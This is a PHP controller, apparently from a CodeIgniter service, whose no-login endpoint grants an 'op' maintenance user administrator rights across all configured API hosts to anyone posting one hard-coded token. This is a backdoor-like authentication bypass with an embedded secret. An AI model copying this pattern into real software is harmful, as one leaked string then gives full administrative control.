<?php
class Op extends MY_Controller
{
    function index_post_nologin()
    {

        $op_token = $this->post('op_token');
        if (empty($op_token)) {
            $this->response(array('error' => '缺少加密串！'));
        }

        // 验证
        if($op_token!='60021539dfce93c49bb4c21c42e2c18b'){
            $this->response(array('error' => '无效'));
        }

    	// 同步
    	$user_row = array(
            'id'=>-9,
            'username' => 'op',
            'real_name' => '运维',
            "level"=>"服务端",
            "permissions"=>"administrator",
            "data_scope"=>"administrator",
            'token' => $this->_token,
            'token_level' => 1,
            'ip'=>$this->_ip,
        );

		$api_hosts = config_item('api_hosts');
		$api_list = array();
		foreach ($api_hosts as $app => $api) {
			$api_list[] = array('post/' . $app . '/sync/login', array('auth_code' => API_encode($app, $user_row)));
		}
		$result['results'] = API($api_list);//批量发出

        // 返回结果
        $result ['msg'] = $user_row['username'].'登录成功';
        $result ['token'] = $user_row['token'];
        $result['is_login'] = true;
    	$this->response($result);
    }


}
